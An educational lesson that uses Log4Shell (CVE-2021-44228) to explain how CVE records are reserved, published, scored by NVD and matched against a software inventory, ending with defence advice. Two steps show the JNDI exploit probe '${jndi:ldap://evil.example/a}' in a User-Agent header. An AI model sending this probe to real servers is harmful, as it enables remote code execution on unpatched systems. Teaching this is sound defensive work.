# CVE: a vulnerability's passport

`lesson` A2 · `section` A · `wave` 1 · `format` 1

## Passport

- `cwe` 917, 502
- `owasp` A06:2021
- `attack` T1190
- `cvss` CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- `cves` CVE-2021-44228
- `severity` critical
- `impact` An attack through a long-published vulnerability on a server where nobody noticed it
- `defence` Match new CVE records against your own list of software
- `class` Known vulnerability in a library

## Sources

- [CVE Record: CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)
- [NVD: CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CVE Program: Process](https://www.cve.org/About/Process)
- [CVE Program: Glossary](https://www.cve.org/ResourcesSupport/Glossary)
- [CISA: Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [MITRE CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP Top 10:2021, A06 Vulnerable and Outdated Components](https://owasp.org/Top10/2021/A06_2021-Vulnerable_and_Outdated_Components/)

## Participants

- `cna` **Apache** — CNA · `icon:workstation` · `term:cna`
- `list` **CVE** — records · `icon:document` · `term:cve`
- `nvd` **NVD** — scoring · `icon:db` · `term:nvd`
- `server` **Server** — 198.51.100.10 · `term:web-server`
- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`

## Zones

- `program` CVE Program: `cna`, `list`, `nvd`

## Steps

### `reserve` Number reserved

`cna → list` · `legit`
Message: reserve a number · Result: taken

```text
CVE-2021-44228   state: RESERVED   since 2021-11-26
```

#### Simple

Apache learns about a bug in its logging library Log4j and **reserves a number** for it. The
number exists, but what the bug is has not been said yet: the fix is not ready.

#### Step by step

Not just anyone hands out numbers, but a CNA: an organization the CVE Program has authorized to
do so for its products. Apache is one. The number was reserved on 26 November 2021.

#### Deeper

The number is built like this: `CVE`, a year, then four or more digits. The year is the year of
reservation or publication, not the year the bug was found. According to the CVE record, the bug
was discovered by Chen Zhaojun of the Alibaba Cloud Security Team. A record has three states:
Reserved (number taken), Published, and Rejected (number withdrawn but kept on the list).

### `publish` Record published

`cna → list` · `legit`
Message: CVE record · Result: published

```text
ID:          CVE-2021-44228
Assigner:    Apache Software Foundation
Product:     Apache Log4j2
Versions:    2.0-beta9 … 2.15.0, except 2.12.2, 2.12.3, 2.3.1
Weaknesses:  CWE-502, CWE-400, CWE-20
References:  advisories, fixes, write-ups
```

#### Simple

On 10 December 2021 Apache publishes the **record**: which product, which versions, what the bug
is and where to read more. This is the vulnerability's passport.

#### Step by step

The required minimum of a record: the number, a short description, affected products and
versions, references. Here the description says that in Log4j2 the JNDI lookups are not protected
against an attacker's LDAP servers, and whoever controls the log text can run their own code.

#### Deeper

Read the fields carefully. The description text says «through 2.15.0», while the machine-readable
version list already marks 2.15.0 as fixed; releases 2.12.2, 2.12.3 and 2.3.1 are excluded. The
description adds that the bug is only in `log4j-core`. Apache's record lists three weakness
classes, not one: that happens when a bug is made of several.

### `enrich` NVD adds a score

`list → nvd` · `legit`
Message: record · Result: CVSS 10.0

```text
CVSS 3.1:   10.0  AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
CWE (NVD):  CWE-917
Products:   log4j version ranges (CPE)
```

#### Simple

NVD, the US government's vulnerability database, takes the record and **adds to** it: a CVSS
severity score, the weakness class and an exact list of affected products.

#### Step by step

A score of 10.0 out of 10 is the highest. To the three weaknesses in Apache's record NVD added its
own: CWE-917, expression language injection. The NVD product list is machine-readable: scanners
use it to find vulnerable versions on their own.

#### Deeper

CVE is the number, CWE the class of mistake, CVSS the severity scale; one CVE can have several
CWEs. The CVE Program itself does not assign scores: NVD, vendors and other participants do. CISA
added this CVE to the KEV catalog the same day, 10 December 2021, with a deadline for US federal
agencies of 24 December.

### `missed` Nobody noticed

`server → server` · `legit` · `without-defence`
Message: skip · Result: Log4j 2.14.1

#### Simple

The shop owner does not know the server contains Log4j: it came **inside** another program. They
never read the CVE record.

#### Step by step

Version 2.14.1 is in the affected range. The server is vulnerable, and the whole world already
knows it.

#### Deeper

You can only find yourself in a record if you know your versions. Without a component list a CVE
record is useless: nobody matches it.

### `matched` Matching the list

`nvd → server` · `safe` · `with-defence`
Message: a match · Result: updated

#### Simple

The owner keeps a **list** of all programs and libraries with versions. A check finds Log4j
2.14.1 in the NVD record, and the library gets updated.

#### Step by step

The match uses the NVD product list. A hit is a signal: read the record's references and install
the fixed version.

#### Deeper

Related bugs in Log4j turned up later, and CISA recommended version 2.17.1 for Java 8. So after
the CVE record, also check the vendor's advisory: it is newer.

### `probe` The attacker's probe

`attacker → server` · `attack` · `without-defence`
Message: probe · Result: executed

```http
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Simple

The attacker reads CVE records too. They send a probe to thousands of servers, and this one
**responds**: the library executes the string.

#### Step by step

How this attack works is shown in lesson K1. What matters here is different: an open record was
enough for the attacker.

#### Deeper

In ATT&CK this is T1190, exploiting an internet-facing application. The CVSS vector in the record
says the same: over the network, no login, no human action.

### `owned` Server taken over

`server → attacker` · `attack` · `without-defence`
Message: access · Result: taken over

#### Simple

The attacker's code runs on the shop's server. The number, the description and the fix had long
been public.

#### Step by step

The attacker gets the server's command line and access to its data.

#### Deeper

A CVE record is equally open to defender and attacker. Whoever read it first and acted on it wins.

### `refused` Probe on the updated server

`attacker → server` · `attack` · `with-defence` · `stopped`
Message: probe · Result: plain text

```http
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Simple

The same probe reaches a server where the library is already updated. The string stays **plain
text** in the log.

#### Step by step

No outbound connection, no foreign code loaded. The attacker moves on to look for the next
server.

#### Deeper

The probe's trace in the log is useful: it shows someone was looking for you, and you can check
your other servers.

## How to defend

- **Know your components.** A list of all programs and libraries with versions, including those
  that came inside other programs.
- **Match fresh records.** Regularly compare the list with new CVE records and NVD product data.
- **Start with KEV.** If a vulnerability is in the KEV catalog, it is already used in attacks: fix
  it first.
- **Read the vendor's advisory.** A CVE record links to it; the recommended version can be newer
  than the one in the description.
- **Update, don't wait.** A CVE number does not protect you: an installed fix does.
